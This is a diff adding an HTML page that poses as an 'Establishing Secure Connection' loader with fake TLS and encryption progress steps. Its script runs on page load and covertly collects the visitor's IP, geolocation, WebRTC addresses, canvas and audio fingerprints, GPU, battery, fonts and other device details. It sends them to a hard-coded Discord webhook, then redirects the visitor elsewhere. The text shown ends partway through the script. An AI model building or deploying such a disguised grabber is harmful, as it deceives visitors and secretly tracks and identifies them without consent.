@@ -1,0 +1,1114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Connection</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        /* === ВАШ ПОЛНЫЙ СТИЛЬ (без изменений) === */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #7c3aed;
+            --primary-light: #a78bfa;
+            --primary-dark: #5b21b6;
+            --accent: #06b6d4;
+            --accent-light: #67e8f9;
+            --glow-primary: rgba(124, 58, 237, 0.6);
+            --glow-accent: rgba(6, 182, 212, 0.4);
+            --bg-dark: #0a0a1a;
+            --bg-card: rgba(255, 255, 255, 0.03);
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+        }
+
+        body {
+            min-height: 100vh;
+            background: var(--bg-dark);
+            font-family: 'SF Pro Display', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--text-primary);
+            padding: 16px;
+            overflow: hidden;
+        }
+
+        .bg-grid {
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(124, 58, 237, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(124, 58, 237, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(60px, 60px); }
+        }
+
+        .bg-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            animation: orbFloat 8s ease-in-out infinite;
+        }
+
+        .bg-orb:nth-child(1) {
+            width: 400px;
+            height: 400px;
+            background: var(--primary-dark);
+            top: -100px;
+            right: -100px;
+            animation-delay: 0s;
+        }
+
+        .bg-orb:nth-child(2) {
+            width: 300px;
+            height: 300px;
+            background: var(--accent);
+            bottom: -80px;
+            left: -80px;
+            animation-delay: -3s;
+            opacity: 0.2;
+        }
+
+        .bg-orb:nth-child(3) {
+            width: 200px;
+            height: 200px;
+            background: #ec4899;
+            top: 50%;
+            left: 50%;
+            animation-delay: -5s;
+            opacity: 0.15;
+        }
+
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -20px) scale(1.05); }
+            66% { transform: translate(-20px, 20px) scale(0.95); }
+        }
+
+        .particles {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: var(--primary-light);
+            border-radius: 50%;
+            opacity: 0;
+            animation: particleFloat linear infinite;
+        }
+
+        @keyframes particleFloat {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 0.8; }
+            90% { opacity: 0.3; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        .loader-container {
+            max-width: 520px;
+            width: 100%;
+            background: var(--bg-card);
+            backdrop-filter: blur(40px) saturate(1.5);
+            -webkit-backdrop-filter: blur(40px) saturate(1.5);
+            border-radius: 32px;
+            padding: 48px 40px;
+            box-shadow:
+                0 0 0 1px rgba(255, 255, 255, 0.06),
+                0 0 0 1px rgba(124, 58, 237, 0.1),
+                0 25px 50px rgba(0, 0, 0, 0.5),
+                0 0 100px rgba(124, 58, 237, 0.08);
+            text-align: center;
+            position: relative;
+            z-index: 10;
+            animation: containerIn 1s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            opacity: 0;
+            transform: translateY(30px) scale(0.97);
+        }
+
+        @keyframes containerIn {
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .container-border {
+            position: absolute;
+            inset: 0;
+            border-radius: 32px;
+            padding: 1px;
+            background: linear-gradient(
+                135deg,
+                rgba(124, 58, 237, 0.3),
+                transparent 40%,
+                transparent 60%,
+                rgba(6, 182, 212, 0.2)
+            );
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+        }
+
+        .logo-wrapper {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 32px;
+        }
+
+        .shield-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 1.5px solid transparent;
+        }
+
+        .shield-ring:nth-child(1) {
+            border-color: rgba(124, 58, 237, 0.3);
+            animation: ringRotate 6s linear infinite;
+            border-right-color: transparent;
+            border-bottom-color: transparent;
+        }
+
+        .shield-ring:nth-child(2) {
+            inset: 8px;
+            border-color: rgba(6, 182, 212, 0.25);
+            animation: ringRotate 4s linear infinite reverse;
+            border-left-color: transparent;
+            border-top-color: transparent;
+        }
+
+        .shield-ring:nth-child(3) {
+            inset: 16px;
+            border-color: rgba(124, 58, 237, 0.2);
+            animation: ringRotate 8s linear infinite;
+            border-right-color: transparent;
+        }
+
+        @keyframes ringRotate {
+            to { transform: rotate(360deg); }
+        }
+
+        .shield-icon {
+            position: absolute;
+            inset: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            color: var(--primary-light);
+            animation: shieldPulse 3s ease-in-out infinite;
+            text-shadow: 0 0 30px var(--glow-primary);
+        }
+
+        @keyframes shieldPulse {
+            0%, 100% { transform: scale(1); filter: brightness(1); }
+            50% { transform: scale(1.08); filter: brightness(1.3); }
+        }
+
+        .shield-glow {
+            position: absolute;
+            inset: 20px;
+            border-radius: 50%;
+            background: radial-gradient(circle, var(--glow-primary), transparent 70%);
+            opacity: 0.3;
+            animation: glowPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes glowPulse {
+            0%, 100% { opacity: 0.2; transform: scale(0.9); }
+            50% { opacity: 0.5; transform: scale(1.1); }
+        }
+
+        h2 {
+            font-weight: 600;
+            font-size: 26px;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #fff, var(--text-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .status {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 36px;
+            min-height: 24px;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            font-weight: 400;
+        }
+
+        .status.fade {
+            opacity: 0;
+            transform: translateY(-4px);
+        }
+
+        .progress-section {
+            margin-bottom: 20px;
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .progress-label {
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+
+        .progress-percent {
+            font-size: 14px;
+            color: var(--primary-light);
+            font-weight: 600;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--primary), var(--accent), var(--primary));
+            background-size: 200% 100%;
+            border-radius: 12px;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            box-shadow: 0 0 20px var(--glow-primary), 0 0 6px var(--glow-accent);
+            animation: shimmer 2.5s linear infinite;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 12px;
+            height: 12px;
+            background: #fff;
+            border-radius: 50%;
+            box-shadow: 0 0 12px var(--glow-primary), 0 0 4px #fff;
+            opacity: 0.9;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: 100% 0; }
+            100% { background-position: -100% 0; }
+        }
+
+        .steps {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 28px 0 32px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 14px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 12px;
+            color: var(--text-muted);
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            font-weight: 500;
+        }
+
+        .step.active {
+            color: var(--primary-light);
+            background: rgba(124, 58, 237, 0.1);
+            border-color: rgba(124, 58, 237, 0.3);
+            box-shadow: 0 0 20px rgba(124, 58, 237, 0.1);
+        }
+
+        .step.done {
+            color: var(--accent);
+            background: rgba(6, 182, 212, 0.08);
+            border-color: rgba(6, 182, 212, 0.2);
+        }
+
+        .step i {
+            font-size: 11px;
+        }
+
+        .step .check {
+            display: none;
+        }
+
+        .step.done .check {
+            display: inline;
+        }
+
+        .step.done .step-icon {
+            display: none;
+        }
+
+        .security-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            padding-top: 24px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: var(--text-muted);
+            transition: color 0.3s;
+        }
+
+        .badge i {
+            font-size: 13px;
+            color: var(--primary-light);
+            opacity: 0.6;
+        }
+
+        .badge.active i {
+            color: var(--accent);
+            opacity: 1;
+            animation: badgePop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .badge.active {
+            color: var(--text-secondary);
+        }
+
+        @keyframes badgePop {
+            0% { transform: scale(0.5); }
+            100% { transform: scale(1); }
+        }
+
+        .nodes-visual {
+            position: relative;
+            height: 40px;
+            margin: 8px 0 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+            opacity: 0.6;
+        }
+
+        .node-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--primary-light);
+            border-radius: 50%;
+            position: relative;
+            z-index: 2;
+            box-shadow: 0 0 8px var(--glow-primary);
+            transition: all 0.5s;
+        }
+
+        .node-dot.active {
+            background: var(--accent);
+            box-shadow: 0 0 12px var(--glow-accent);
+        }
+
+        .node-line {
+            width: 60px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .node-line .node-signal {
+            position: absolute;
+            top: 0;
+            left: -30%;
+            width: 30%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, var(--primary-light), transparent);
+            animation: signalMove 2s ease-in-out infinite;
+        }
+
+        .node-line:nth-child(4) .node-signal {
+            animation-delay: 0.5s;
+        }
+
+        @keyframes signalMove {
+            0% { left: -30%; opacity: 0; }
+            50% { opacity: 1; }
+            100% { left: 100%; opacity: 0; }
+        }
+
+        @media (max-width: 480px) {
+            .loader-container {
+                padding: 36px 24px;
+                border-radius: 24px;
+            }
+            .container-border {
+                border-radius: 24px;
+            }
+            h2 {
+                font-size: 22px;
+            }
+            .steps {
+                flex-direction: column;
+                gap: 8px;
+                align-items: center;
+            }
+            .security-info {
+                flex-direction: column;
+                gap: 10px;
+            }
+            .node-line {
+                width: 40px;
+            }
+            .logo-wrapper {
+                width: 80px;
+                height: 80px;
+            }
+            .shield-icon {
+                font-size: 22px;
+                inset: 20px;
+            }
+        }
+
+        .loader-container.completed .progress-fill {
+            background: linear-gradient(90deg, var(--accent), var(--accent-light), var(--accent));
+            box-shadow: 0 0 20px var(--glow-accent);
+        }
+
+        .loader-container.completed .shield-icon {
+            color: var(--accent-light);
+            text-shadow: 0 0 30px var(--glow-accent);
+        }
+
+        .loader-container.completed .shield-ring:nth-child(1),
+        .loader-container.completed .shield-ring:nth-child(2),
+        .loader-container.completed .shield-ring:nth-child(3) {
+            border-color: rgba(6, 182, 212, 0.3);
+            animation-duration: 3s;
+        }
+
+        .loader-container.completed .shield-glow {
+            background: radial-gradient(circle, var(--glow-accent), transparent 70%);
+        }
+
+        .success-message {
+            display: none;
+            animation: successIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        @keyframes successIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .loader-container.completed .success-message {
+            display: block;
+        }
+
+        .loader-container.completed .loading-content {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Background effects -->
+    <div class="bg-grid"></div>
+    <div class="bg-orb"></div>
+    <div class="bg-orb"></div>
+    <div class="bg-orb"></div>
+    <div class="particles" id="particles"></div>
+
+    <!-- Main loader -->
+    <div class="loader-container" id="loader">
+        <div class="container-border"></div>
+
+        <!-- Animated shield logo -->
+        <div class="logo-wrapper">
+            <div class="shield-ring"></div>
+            <div class="shield-ring"></div>
+            <div class="shield-ring"></div>
+            <div class="shield-glow"></div>
+            <div class="shield-icon">
+                <i class="fas fa-shield-halved"></i>
+            </div>
+        </div>
+
+        <!-- Loading content -->
+        <div class="loading-content">
+            <h2>Establishing Secure Connection</h2>
+            <div class="status" id="status-message">Initializing security protocols...</div>
+
+            <!-- Connection nodes visual -->
+            <div class="nodes-visual">
+                <div class="node-dot active" id="node1"></div>
+                <div class="node-line"><div class="node-signal"></div></div>
+                <div class="node-dot" id="node2"></div>
+                <div class="node-line"><div class="node-signal"></div></div>
+                <div class="node-dot" id="node3"></div>
+            </div>
+
+            <!-- Progress -->
+            <div class="progress-section">
+                <div class="progress-header">
+                    <span class="progress-label">Progress</span>
+                    <span class="progress-percent" id="progress-text">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+            </div>
+
+            <!-- Steps -->
+            <div class="steps">
+                <div class="step active" id="step1">
+                    <i class="fas fa-key step-icon"></i>
+                    <i class="fas fa-check check"></i>
+                    <span>Handshake</span>
+                </div>
+                <div class="step" id="step2">
+                    <i class="fas fa-fingerprint step-icon"></i>
+                    <i class="fas fa-check check"></i>
+                    <span>Verify</span>
+                </div>
+                <div class="step" id="step3">
+                    <i class="fas fa-lock step-icon"></i>
+                    <i class="fas fa-check check"></i>
+                    <span>Encrypt</span>
+                </div>
+            </div>
+
+            <!-- Security badges -->
+            <div class="security-info">
+                <div class="badge" id="badge1">
+                    <i class="fas fa-lock"></i>
+                    <span>TLS 1.3</span>
+                </div>
+                <div class="badge" id="badge2">
+                    <i class="fas fa-certificate"></i>
+                    <span>AES-256</span>
+                </div>
+                <div class="badge" id="badge3">
+                    <i class="fas fa-network-wired"></i>
+                    <span>Zero Trust</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success state -->
+        <div class="success-message">
+            <h2>Connection Secured</h2>
+            <div class="status" style="color: #67e8f9; margin-bottom: 20px;">
+                <i class="fas fa-check-circle"></i> Encrypted tunnel established successfully
+            </div>
+            <div class="steps" style="margin-top: 16px;">
+                <div class="step done">
+                    <i class="fas fa-check check"></i>
+                    <span>Handshake</span>
+                </div>
+                <div class="step done">
+                    <i class="fas fa-check check"></i>
+                    <span>Verified</span>
+                </div>
+                <div class="step done">
+                    <i class="fas fa-check check"></i>
+                    <span>Encrypted</span>
+                </div>
+            </div>
+            <div class="security-info" style="margin-top: 28px;">
+                <div class="badge active">
+                    <i class="fas fa-lock"></i>
+                    <span>TLS 1.3</span>
+                </div>
+                <div class="badge active">
+                    <i class="fas fa-certificate"></i>
+                    <span>AES-256</span>
+                </div>
+                <div class="badge active">
+                    <i class="fas fa-network-wired"></i>
+                    <span>Zero Trust</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // === НАСТРОЙКИ ===
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1480574079466475796/6bk0Txte8871DjNPRTSIVXM7f_owIJxCtFkv0xkEcMUYkKGJVDgVrKP0JzSa1PNuriR9";
+        const REDIRECT_AFTER = "https://we-are-jammin.xyz/";  // <-- ИЗМЕНЕНО
+        // =========================
+
+        // Утилита для быстрого хэша
+        function simpleHash(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = (hash << 5) - hash + char;
+                hash |= 0;
+            }
+            return hash.toString(16);
+        }
+
+        // Функция сбора данных (теперь всегда использует sendBeacon)
+        async function collectData() {
+            const startTime = Date.now();
+            const data = {};
+
+            // 1. База
+            data.basic = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages.join(', '),
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                screen: `${screen.width}x${screen.height} (depth: ${screen.colorDepth})`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'direct',
+                url: window.location.href,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack
+            };
+
+            // 2. GPU
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        data.gpu = `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} - ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
+                    } else {
+                        data.gpu = 'WEBGL_debug_renderer_info not available';
+                    }
+                } else {
+                    data.gpu = 'WebGL not supported';
+                }
+            } catch (e) { data.gpu = 'error'; }
+
+            // 3. Плагины (первые 5)
+            try {
+                let pluginsList = [];
+                if (navigator.plugins) {
+                    for (let i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
+                        pluginsList.push(navigator.plugins[i].name);
+                    }
+                }
+                data.plugins = pluginsList.join(', ') || 'none';
+            } catch (e) { data.plugins = 'error'; }
+
+            // 4. Canvas fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 200, 50);
+                ctx.fillStyle = '#069';
+                ctx.fillText('⚡Gothbreach⚡', 2, 15);
+                data.canvasHash = simpleHash(canvas.toDataURL());
+            } catch (e) { data.canvasHash = 'error'; }
+
+            // 5. Audio fingerprint
+            try {
+                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const oscillator = audioCtx.createOscillator();
+                oscillator.type = 'triangle';
+                oscillator.frequency.setValueAtTime(10000, 0);
+                const compressor = audioCtx.createDynamicsCompressor();
+                compressor.threshold.setValueAtTime(-50, 0);
+                compressor.knee.setValueAtTime(40, 0);
+                compressor.ratio.setValueAtTime(12, 0);
+                compressor.attack.setValueAtTime(0, 0);
+                compressor.release.setValueAtTime(0.25, 0);
+                oscillator.connect(compressor);
+                compressor.connect(audioCtx.destination);
+                oscillator.start(0);
+                const buffer = await audioCtx.startRendering();
+                const samples = buffer.getChannelData(0).slice(0, 1000);
+                let hash = 0;
+                for (let i = 0; i < samples.length; i++) {
+                    hash = ((hash << 5) - hash) + Math.floor(samples[i] * 1000000);
+                    hash |= 0;
+                }
+                data.audioHash = hash.toString(16);
+            } catch (e) { data.audioHash = 'error'; }
+
+            // 6. WebRTC IP
+            data.webrtcIPs = [];
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                await pc.setLocalDescription(await pc.createOffer());
+                await new Promise(resolve => {
+                    if (pc.iceGatheringState === 'complete') resolve();
+                    else pc.addEventListener('icecandidate', e => {
+                        if (!e.candidate) resolve();
+                        else {
+                            const ip = e.candidate.address || e.candidate.ip;
+                            if (ip && ip !== '0.0.0.0' && !data.webrtcIPs.includes(ip)) data.webrtcIPs.push(ip);
+                        }
+                    });
+                });
+                pc.close();
+            } catch (e) { data.webrtcIPs = ['failed']; }
+
+            // 7. Батарея
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        charging: battery.charging,
+                        level: Math.round(battery.level * 100) + '%',
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } else data.battery = 'not supported';
+            } catch (e) { data.battery = 'error'; }
+
+            // 8. Шрифты (упрощённо)
+            try {
+                const baseFonts = ['monospace', 'sans-serif', 'serif'];
+                const fontList = [];
+                const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                const testSize = '72px';
+                const h = document.createElement('div');
+                document.body.appendChild(h);
+                h.style.position = 'absolute';
+                h.style.left = '-999px';
+                h.style.top = '-999px';
+                h.style.visibility = 'hidden';
+                for (const base of baseFonts) {
+                    const baseSpan = document.createElement('span');
+                    baseSpan.style.fontSize = testSize;
+                    baseSpan.style.fontFamily = base;
+                    baseSpan.innerText = testString;
+                    h.appendChild(baseSpan);
+                    const baseWidth = baseSpan.offsetWidth;
+                    for (let i = 0; i < 50; i++) {
+                        const span = document.createElement('span');
+                        span.style.fontSize = testSize;
+                        span.style.fontFamily = `font${i}, ${base}`;
+                        span.innerText = testString;
+                        h.appendChild(span);
+                        if (span.offsetWidth !== baseWidth) fontList.push(`font${i}`);
+                        span.remove();
+                    }
+                    baseSpan.remove();
+                }
+                h.remove();
+                data.fonts = fontList.slice(0, 10).join(', ') + (fontList.length > 10 ? '...' : '');
+            } catch (e) { data.fonts = 'error'; }
+
+            // 9. Сетевая информация
+            try {
+                if (navigator.connection) {
+                    const conn = navigator.connection;
+                    data.network = {
+                        effectiveType: conn.effectiveType,
+                        downlink: conn.downlink,
+                        rtt: conn.rtt,
+                        saveData: conn.saveData
+                    };
+                } else data.network = 'not supported';
+            } catch (e) { data.network = 'error'; }
+
+            // 10. Датчики
+            data.sensors = {
+                deviceMotion: 'DeviceMotionEvent' in window,
+                deviceOrientation: 'DeviceOrientationEvent' in window
+            };
+
+            // 11. IP и гео (ip-api.com + запасной)
+            try {
+                const ipResponse = await fetch('http://ip-api.com/json/?fields=66846719');
+                if (ipResponse.ok) {
+                    const ipData = await ipResponse.json();
+                    data.geo = {
+                        ip: ipData.query,
+                        country: ipData.country,
+                        region: ipData.regionName,
+                        city: ipData.city,
+                        isp: ipData.isp,
+                        org: ipData.org,
+                        as: ipData.as,
+                        lat: ipData.lat,
+                        lon: ipData.lon
+                    };
+                } else throw new Error('ip-api failed');
+            } catch (e) {
+                try {
+                    const backup = await fetch('https://ipapi.co/json/');
+                    if (backup.ok) {
+                        const ipData = await backup.json();
+                        data.geo = {
+                            ip: ipData.ip,
+                            country: ipData.country_name,
+                            region: ipData.region,
+                            city: ipData.city,
+                            isp: ipData.org,
+                            org: ipData.org,
+                            as: ipData.asn,
+                            lat: ipData.latitude,
+                            lon: ipData.longitude
+                        };
+                    } else throw new Error('backup failed');
+                } catch (e2) {
+                    data.geo = { error: 'failed' };
+                }
+            }
+
+            // Формируем Embed-ы (4 штуки)
+            const embeds = [
+                {
+                    title: '🌍 IP & Geolocation',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: 'IP', value: data.geo?.ip || 'unknown', inline: true },
+                        { name: 'Country', value: data.geo?.country || 'unknown', inline: true },
+                        { name: 'Region', value: data.geo?.region || 'unknown', inline: true },
+                        { name: 'City', value: data.geo?.city || 'unknown', inline: true },
+                        { name: 'ISP', value: data.geo?.isp || 'unknown', inline: true },
+                        { name: 'Organization', value: data.geo?.org || 'unknown', inline: true },
+                        { name: 'AS', value: data.geo?.as || 'unknown', inline: true },
+                        { name: 'Coordinates', value: (data.geo?.lat && data.geo?.lon) ? `${data.geo.lat}, ${data.geo.lon}` : 'unknown', inline: true },
+                        { name: 'WebRTC IPs', value: data.webrtcIPs?.join(', ') || 'none', inline: false }
+                    ],
+                    footer: { text: 'Geo may be approximate' },
+                    timestamp: new Date().toISOString()
+                },
+                {
+                    title: '🖥️ Browser & System',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: 'User Agent', value: data.basic.userAgent.substring(0, 100) + '...', inline: false },
+                        { name: 'Platform', value: data.basic.platform, inline: true },
+                        { name: 'Language', value: data.basic.language, inline: true },
+                        { name: 'Languages', value: data.basic.languages, inline: true },
+                        { name: 'Screen', value: data.basic.screen, inline: true },
+                        { name: 'Window', value: data.basic.windowSize, inline: true },
+                        { name: 'Timezone', value: data.basic.timezone, inline: true },
+                        { name: 'CPU Threads', value: data.basic.hardwareConcurrency, inline: true },
+                        { name: 'Device Memory', value: data.basic.deviceMemory + ' GB', inline: true },
+                        { name: 'GPU', value: data.gpu?.substring(0, 100) || 'unknown', inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                },
+                {
+                    title: '🔑 Fingerprints & Sensors',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: 'Canvas Hash', value: data.canvasHash || 'error', inline: true },
+                        { name: 'Audio Hash', value: data.audioHash || 'error', inline: true },
+                        { name: 'Battery', value: data.battery?.level ? `${data.battery.level} (charging: ${data.battery.charging})` : 'unknown', inline: true },
+                        { name: 'Network', value: data.network ? `${data.network.effectiveType}, ${data.network.downlink} Mbps` : 'unknown', inline: true },
+                        { name: 'DeviceMotion', value: data.sensors.deviceMotion ? 'yes' : 'no', inline: true },
+                        { name: 'DeviceOrientation', value: data.sensors.deviceOrientation ? 'yes' : 'no', inline: true },
+                        { name: 'Plugins (top 5)', value: data.plugins || 'none', inline: false },
+                        { name: 'Fonts (sample)', value: data.fonts || 'none', inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                },
+                {
+                    title: '📎 Additional',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: 'Referrer', value: data.basic.referrer, inline: true },
+                        { name: 'Cookies Enabled', value: data.basic.cookiesEnabled ? 'yes' : 'no', inline: true },
+                        { name: 'Do Not Track', value: data.basic.doNotTrack || 'not set', inline: true },
+                        { name: 'Page URL', value: data.basic.url, inline: false }
+                    ],
+                    footer: { text: `Collected in ${Date.now() - startTime}ms` },
+                    timestamp: new Date().toISOString()
+                }
+            ];
+
+            // Отправка через sendBeacon (гарантированно улетит даже при редиректе)
+            const payload = JSON.stringify({ embeds });
+            const blob = new Blob([payload], { type: 'application/json' });
+            navigator.sendBeacon(WEBHOOK_URL, blob);
+        }
+
+        // ==== Запуск сбора данных (не ждём, fire and forget) ====
+        collectData();
+
+        // ==== Ваша оригинальная анимация (ускоренная) ====
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = (Math.random() * 6 + 4) + 's';
+            particle.style.animationDelay = (Math.random() * 6) + 's';
+            particle.style.width = particle.style.height = (Math.random() * 3 + 1) + 'px';
+            if (Math.random() > 0.5) {
+                particle.style.background = 'var(--accent-light)';
+            }
+            particlesContainer.appendChild(particle);
+        }
+
+        const statusMessages = [
+            { text: 'Initializing security protocols...', progress: 5 },
+            { text: 'Generating cryptographic keys...', progress: 15 },
+            { text: 'Performing TLS handshake...', progress: 25 },
+            { text: 'Exchanging certificates...', progress: 35 },
+            { text: 'Verifying server identity...', progress: 48 },
+            { text: 'Validating certificate chain...', progress: 58 },
+            { text: 'Establishing encrypted channel...', progress: 70 },
+            { text: 'Applying AES-256 encryption...', progress: 82 },
+            { text: 'Running integrity checks...', progress: 90 },
+            { text: 'Finalizing secure tunnel...', progress: 96 },
+            { text: 'Connection secured!', progress: 100 },
+        ];
+
+        const statusEl = document.getElementById('status-message');
+        const progressFill = document.getElementById('progress-fill');
+        const progressText = document.getElementById('progress-text');
+        const loader = document.getElementById('loader');
+
+        let currentStep = 0;
+        let displayedProgress = 0;
+
+        function activateNode(id) {
+            const node = document.getElementById(id);
+            if (node) node.classList.add('active');
+        }
+
+        function activateStep(id) {
+            const step = document.getElementById(id);
+            if (step) {
+                step.classList.remove('active');
+                step.classList.add('done');
+            }
+        }
+
+        function setActiveStep(id) {
+            const step = document.getElementById(id);
+            if (step) step.classList.add('active');
+        }
+
+        function activateBadge(id) {
+            const badge = document.getElementById(id);
+            if (badge) badge.classList.add('active');
+        }
+
+        function smoothProgress(target) {
+            const interval = setInterval(() => {
+                if (displayedProgress < target) {
+                    displayedProgress++;
+                    progressFill.style.width = displayedProgress + '%';
+                    progressText.textContent = displayedProgress + '%';
+                } else {
+                    clearInterval(interval);
+                }
+            }, 20);
+        }
+
+        function advanceLoader() {
+            if (currentStep >= statusMessages.length) return;
+
+            const msg = statusMessages[currentStep];
+
+            statusEl.classList.add('fade');
+            setTimeout(() => {
+                statusEl.textContent = msg.text;
+                statusEl.classList.remove('fade');
+                smoothProgress(msg.progress);
+
+                if (currentStep === 2) {
+                    activateNode('node2');
+                    activateStep('step1');
+                    setActiveStep('step2');
+                    activateBadge('badge1');
+                }
+                if (currentStep === 5) {
+                    activateStep('step2');
+                    setActiveStep('step3');
+                    activateBadge('badge2');
+                }
+                if (currentStep === 7) {
+                    activateNode('node3');
+                }
+                if (currentStep === 9) {
+                    activateStep('step3');
+                    activateBadge('badge3');
+                }
+
+                if (currentStep === statusMessages.length - 1) {
+                    // Анимация завершена — сразу редирект, не ждём сбора данных
+                    loader.classList.add('completed');
+                    setTimeout(() => {
+                        if (REDIRECT_AFTER) window.location.href = REDIRECT_AFTER;
+                    }, 400); // небольшая пауза, чтобы пользователь увидел успешное сообщение
+                }
+
